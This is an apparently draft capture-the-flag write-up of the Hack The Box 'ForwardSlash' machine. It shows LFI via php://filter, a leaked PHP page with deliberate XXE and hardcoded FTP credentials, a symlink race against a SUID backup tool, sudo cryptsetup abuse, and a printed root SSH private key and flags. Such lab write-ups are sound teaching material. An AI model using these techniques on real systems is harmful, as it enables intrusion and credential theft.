***/***/b****p and /****/****/e*************r/e********.p*

e*************r is the right way, don't use the rock, try your own brute. Don't filter results, put all in a file and then scrape through it.

Got some database cred through php base64 filter but the hash is too long doesn't seem like a hash plus it's for www-data or may be a rabbit hole? Got to a xml page through ssrf on changing profilepicture.php..any nudge? Enumerated everything through the lfi couldn't find anything...

# HTB - <Machine_Name>

## Overview

![](<machine>.infocard.png)

<Short description to include any strange things to be dealt with> 

## Useful Skills and Tools

#### <Useful thing 1>

<description with generic example>

#### <Useful thing 2>

<description with generic example>

## Enumeration

### Nmap scan

Like always, I started my enumeration with an nmap scan of `<ip>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, `-oA <name>` saves all types of output \(`.nmap`,`.gnmap`, and `.xml`\) with filenames of `<name>`.

At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally. The scan only showed one port open during my initial scan so I ran it again to verify, and it came back with the same results.

Only two ports op, 80 & 22

port 80 redirects to forwardslash.htb - add to hosts

title - Backslash Gang

#Defaced • This was ridiculous, who even uses XML and Automatic FTP Logins

From Player - Ippsec https://www.youtube.com/watch?v=JpzREo7XLOY: vhost enumeration
```
zweilos@kalimaa:~/htb/forwardslash$ gobuster vhost -u http://forwardslash.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://forwardslash.htb
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2020/07/03 13:41:04 Starting gobuster
===============================================================
Found: backup.forwardslash.htb (Status: 302) [Size: 33]
===============================================================
2020/07/03 13:50:13 Finished
===============================================================

```
add to /etc/hosts

auto-redirects to http://backup.forwardslash.htb/login.php

http://backup.forwardslash.htb/environment.php - fun fact
http://backup.forwardslash.htb/hof.php - hall of fame
```
cewl -H Cookie:PHPSESSID=h8242m3lv04gh9veco69de98ni http://backup.forwardslash.htb/environment.php >> forwardslash.cewl
```
always add new sites to cewl word list just in case

http://backup.forwardslash.htb/profilepicture.php can upload files after removing "disabled" attributes

https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/
```
<!-- TODO: removed all the code to actually change the picture after backslash gang
 attacked us, simply echos as debug now -->
```

```
zweilos@kalimaa:~$ wfuzz -X GET -c -w /usr/share/wordlists/dirb/big.txt --hc 404  http://backup.forwardslash.htb/FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://backup.forwardslash.htb/FUZZ
Total requests: 20469

===================================================================
ID           Response   Lines    Word     Chars       Payload                                
===================================================================

000000015:   403        9 L      28 W     288 Ch      ".htaccess"                            
000000016:   403        9 L      28 W     288 Ch      ".htpasswd"                            
000006005:   301        9 L      28 W     332 Ch      "dev"                                  
000016215:   403        9 L      28 W     288 Ch      "server-status"                        

Total time: 102.3836
Processed Requests: 20469
Filtered Requests: 20465
Requests/sec.: 199.9245
```
127.0.1.1
```
HTTP/1.1 408 Request Timeout
Date: Sat, 04 Jul 2020 13:42:37 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 296
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>408 Request Timeout</title>
</head><body>
<h1>Request Timeout</h1>
<p>Server timeout waiting for the HTTP request from the client.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 127.0.1.1 Port 80</address>
</body></html>
```
```
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin 
lxd:x:105:65534::/var/lib/lxd/:/bin/false 
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false 
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin 
pain:x:1000:1000:pain:/home/pain:/bin/bash 
chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash 
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false 
```
user with login: chiv and pain; have seen them both in the HTML notes to each other

config.php
```
<?php
//credentials for the temp db while we recover, had to backup old config, didn't want it getting compromised -pain
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'www-data');
define('DB_PASSWORD', '5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec');
define('DB_NAME', 'site');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```
./api.php, login.php, profilepicture.php = "Permission Denied; not that way ;)"

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/73aa26ba6891981ec2254907b9bbd4afdc745e1d/File%20Inclusion/README.md#wrapper-phpfilter

code to bypass php filter: either encode in b64 or rot-13, or ... 

went down the list of files I could access until: `pHp://FilTer/convert.base64-encode/resource=dev/index.php`
gets:
```
PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K
```
which decodes to:
dev/index.php
```
<?php
//include_once ../session.php;
// Initialize the session
session_start();

if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true || $_SESSION['username'] !== "admin") && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1"){
    header('HTTP/1.0 403 Forbidden');
    echo "<h1>403 Access Denied</h1>";
    echo "<h3>Access Denied From ", $_SERVER['REMOTE_ADDR'], "</h3>";
    //echo "<h2>Redirecting to login in 3 seconds</h2>"
    //echo '<meta http-equiv="refresh" content="3;url=../login.php" />';
    //header("location: ../login.php");
    exit;
}
?>
<html>
	<h1>XML Api Test</h1>
	<h3>This is our api test for when our new website gets refurbished</h3>
	<form action="/dev/index.php" method="get" id="xmltest">
		<textarea name="xml" form="xmltest" rows="20" cols="50"><api>
    <request>test</request>
</api>
</textarea>
		<input type="submit">
	</form>

</html>

<!-- TODO:
Fix FTP Login
-->

<?php
if ($_SERVER['REQUEST_METHOD'] === "GET" && isset($_GET['xml'])) {

	$reg = '/ftp:\/\/[\s\S]*\/\"/';
	//$reg = '/((((25[0-5])|(2[0-4]\d)|([01]?\d?\d)))\.){3}((((25[0-5])|(2[0-4]\d)|([01]?\d?\d))))/'

	if (preg_match($reg, $_GET['xml'], $match)) {
		$ip = explode('/', $match[0])[2];
		echo $ip;
		error_log("Connecting");

		$conn_id = ftp_connect($ip) or die("Couldn't connect to $ip\n");

		error_log("Logging in");

		if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {

			error_log("Getting file");
			echo ftp_get_string($conn_id, "debug.txt");
		}

		exit;
	}

	libxml_disable_entity_loader (false);
	$xmlfile = $_GET["xml"];
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$api = simplexml_import_dom($dom);
	$req = $api->request;
	echo "-----output-----<br>\r\n";
	echo "$req";
}

function ftp_get_string($ftp, $filename) {
    $temp = fopen('php://temp', 'r+');
    if (@ftp_fget($ftp, $temp, $filename, FTP_BINARY, 0)) {
        rewind($temp);
        return stream_get_contents($temp);
    }
    else {
        return false;
    }
}

?>
```
creds in dev/index.php work for SSH
ssh chiv@forwardslash.htb

## Initial Foothold
### Enumeration as user `chiv`

```
[+] System stats
Filesystem      Size  Used Avail Use% Mounted on                                                        
udev            1.9G     0  1.9G   0% /dev
tmpfs           393M  1.4M  391M   1% /run
/dev/sda2        20G  6.0G   13G  33% /
tmpfs           2.0G  168K  2.0G   1% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
/dev/loop0       92M   92M     0 100% /snap/core/8689
/dev/loop1       90M   90M     0 100% /snap/core/8268
tmpfs           393M     0  393M   0% /run/user/1001
```
open ports
```
Active Internet connections (servers and established)                                                   
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      1 10.10.10.183:49396      8.8.4.4:53              SYN_SENT    -                   
tcp        0    624 10.10.10.183:22         10.10.15.82:45984       ESTABLISHED -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.1:51573         127.0.0.53:53           ESTABLISHED -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*
```
users
```
[+] Users with console
chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash                                                        
pain:x:1000:1000:pain:/home/pain:/bin/bash
root:x:0:0:root:/root:/bin/bash
```
/usr/bin/pkexec
chfn (chsh)
usr/bin/backup

```
[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
...snipped...
-r--r--r-- 1 root root 129 May 27  2019 /var/backups/note.txt
```
```
[+] Searching passwords in config PHP files
define('DB_PASSWORD', '5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec');
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
```

## Road to User

```
chiv@forwardslash:/home/pain$ ls
encryptorinator  note.txt  user.txt
chiv@forwardslash:/home/pain$ cat note.txt 
Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.

-chiv

chiv@forwardslash:/home/pain/encryptorinator$ ls -la
total 16
drwxr-xr-x 2 pain root 4096 Mar 24 12:06 .
drwxr-xr-x 7 pain pain 4096 Mar 17 20:28 ..
-rw-r--r-- 1 pain root  165 Jun  3  2019 ciphertext
-rw-r--r-- 1 pain root  931 Jun  3  2019 encrypter.py
```
exfiltrate to my machine
```
chiv@forwardslash:/home/pain/encryptorinator$ python -m SimpleHTTPServer 8099
Serving HTTP on 0.0.0.0 port 8099 ...
10.10.15.82 - - [06/Jul/2020 14:05:44] code 404, message File not found
10.10.15.82 - - [06/Jul/2020 14:05:44] "GET /encryptor.py HTTP/1.1" 404 -
10.10.15.82 - - [06/Jul/2020 14:05:56] "GET /encrypter.py HTTP/1.1" 200 -
10.10.15.82 - - [06/Jul/2020 14:06:07] "GET /ciphertext HTTP/1.1" 200 -
```
python script is redacted
```
print encrypt('REDACTED', 'REDACTED')
print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
```
lets check the backups we saw and see if the whole script is available
```
-r-sr-xr-x  1 pain   pain       13384 Mar  6 10:06  backup
```
has suid bit set but is owned by pain.  If we can switch to this user may be able to use this binary to privesc
```
chiv@forwardslash:/var/backups$ ls -la
total 1004
drwxr-xr-x  3 root root             4096 Jul  6 06:25 .
drwxr-xr-x 14 root root             4096 Mar  5 14:25 ..
-rw-r--r--  1 root root            61440 Mar 24 06:25 alternatives.tar.0
-rw-r--r--  1 root root            38908 Mar 24 06:17 apt.extended_states.0
-rw-r--r--  1 root root             4115 Mar  6 14:17 apt.extended_states.1.gz
-rw-r--r--  1 root root             3909 Mar  5 14:46 apt.extended_states.2.gz
-rw-------  1 pain pain              526 Jun 21  2019 config.php.bak
-rw-r--r--  1 root root              437 Mar  5 14:07 dpkg.diversions.0
-rw-r--r--  1 root root              202 Mar  5 14:07 dpkg.diversions.1.gz
-rw-r--r--  1 root root              207 Mar  5 14:47 dpkg.statoverride.0
-rw-r--r--  1 root root              171 Mar  5 14:47 dpkg.statoverride.1.gz
-rw-r--r--  1 root root           668374 Mar 24 06:17 dpkg.status.0
-rw-r--r--  1 root root           188241 Mar 24 06:17 dpkg.status.1.gz
-rw-------  1 root root              730 Mar 17 20:13 group.bak
-rw-------  1 root shadow            604 Mar 17 20:13 gshadow.bak
-r--r--r--  1 root root              129 May 27  2019 note.txt
-rw-------  1 root root             1660 Mar  5 14:46 passwd.bak
drwxrwx---  2 root backupoperator   4096 May 27  2019 recovery
-rw-------  1 root shadow           1174 Mar  6 14:21 shadow.bak
chiv@forwardslash:/var/backups$ cat note.txt 
Chiv, this is the backup of the old config, the one with the password we need to actually keep safe. Please DO NOT TOUCH.

-Pain
```
-rw-------  1 pain pain              526 Jun 21  2019 config.php.bak

recieved `UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 932: invalid continuation byte` while trying to decrypt.  (have seen this with rockyou.txt in the past as well)

https://github.com/wpscanteam/wpscan/issues/190 - encoding problems with rockyou.txt and ciphertext solved by using `'latin'` encoding
```
zweilos@kalimaa:~/htb/forwardslash$ vi -c 'let $enc = &fileencoding | execute "!echo Encoding:  $enc" | q' ciphertext 

Encoding: latin1

Press ENTER or type command to continue
```
ouput
```
zweilos@kalimaa:~/htb/forwardslash$ python3 ./decryptor.py
plaintext found: ©¹b`ÛºK§T=ox&yorSÔaé[8vá[(ý;fryption tool, pretty secure hÏäþð5ÖMG3õzhere is the key to the encrypted image from /var/backups/recovery: cB!6%sdHòj^@Y*$C2cf
The key was: theroadtorainbows
```
unfortunately neither of these are `pain`'s or the root password, and we do not have access to `/var/backups/recovery`.  Will need to go back and check out that `backup` binary again.  Since its in path I just ran it.  
```
chiv@forwardslash:~$ backup
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet, 
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 17:14:04
ERROR: d09b25378e01dd1af648dca8a641e52e Does Not Exist or Is Not Accessible By Me, Exiting...
```
hmmm...its looking for the hash of something, and says something about only working if the backup is taken in the same second, and displays the time. After some experimentation, discovered that the hash is an md5 hash of the current time in `HH:MM:SS` format.  `echo $(date +%T) | md5sum | cut -c1-32` will get me a hash of the time that matches the time in the backup program, now need to script reading the file and sending the hash at the same time

Try it on the config backup.  I had seen a long hash in the one I found before, maybe this one is pre-encryption.

Oooohhhh...need to make a symbolic link of the file, to the proper hash; also don't need to call backup on the file, just run it in the directory you want it to work on

After much trial and error: getting the hash of the time wasn't working (machine or network lag perhaps?) so I decided to pull the hash directly from the program and symlink the backup file to it
```
chiv@forwardslash:/dev/shm$ ./bak.sh 
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet, 
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 18:33:28
File cannot be opened.
```
after some more trial and error...found out that the script must be executed from user's home directory.  Successfully got my test file to be read. Next, the config backup/.


### Further enumeration

### Finding user creds
```
chiv@forwardslash:~$ /dev/shm/bak.sh 
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet, 
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 18:38:30
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'pain');
define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
define('DB_NAME', 'site');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```
Tried to decrypt the password at first, though it was not a hash despite its looks, was the actual password



### User.txt
```
pain@forwardslash:~$ ls
encryptorinator  note.txt  user.txt
pain@forwardslash:~$ cat user.txt 
cd2c04d272619fd6777527f19fd38cf8
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User <username>
```
pain@forwardslash:/var/backups/recovery$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
```
since I had already decrypted the backup password earlier with my python script this part was fairly straightforward.  

from http://manpages.ubuntu.com/manpages/xenial/man8/cryptsetup.8.html.  

>luksOpen <device> <name> (old syntax)

              Opens the LUKS device <device> and  sets  up  a  mapping  <name>  after  successful
              verification  of  the  supplied  passphrase.  If the passphrase is not supplied via
              --key-file, the command prompts for it interactively.
The commands we are allowed to use with sudo spell out what we can do.  the device name will be our backup file, the `<name>` will be `backup` (command says `/bin/mount /dev/mapper/backup ./mnt/`) and we will need to make a directory called ./mnt/

### Getting a shell
```
pain@forwardslash:/var/backups/recovery$ sudo cryptsetup luksOpen encrypted_backup.img backup
Enter passphrase for encrypted_backup.img: 
pain@forwardslash:/var/backups/recovery$ sudo /bin/mount /dev/mapper/backup ./mnt/
pain@forwardslash:/var/backups/recovery$ cd mnt/
pain@forwardslash:/var/backups/recovery/mnt$ ls
id_rsa
pain@forwardslash:/var/backups/recovery/mnt$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK
RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf
yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc
u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu
NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9
MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa
V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg
G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO
3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC
vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p
MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD
Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn
5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs
V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg
e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8
6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh
i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq
tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW
woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi
/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA
1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW
J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr
OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw
ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo
ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
-----END RSA PRIVATE KEY-----
```

### Root.txt
As always, make sure to apply `chmod 600 <file>` to your ssh private keys!
```
zweilos@kalimaa:~/htb/forwardslash$ ssh -i root.id_rsa root@10.10.10.183
load pubkey "root.id_rsa": invalid format
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'root.id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "root.id_rsa": bad permissions
root@10.10.10.183's password: 

zweilos@kalimaa:~/htb/forwardslash$ chmod 600 root.id_rsa 
zweilos@kalimaa:~/htb/forwardslash$ ssh -i root.id_rsa root@10.10.10.183
load pubkey "root.id_rsa": invalid format
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
root@forwardslash:~# cat root.txt 
a6a94932e6c6b3d237b147c5abca2287
```
and...root.

Thanks to [`InfoSecJack`](https://www.hackthebox.eu/home/users/profile/52045) [`chivato`](https://www.hackthebox.eu/home/users/profile/44614)& for <something interesting or useful about this machine.

If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
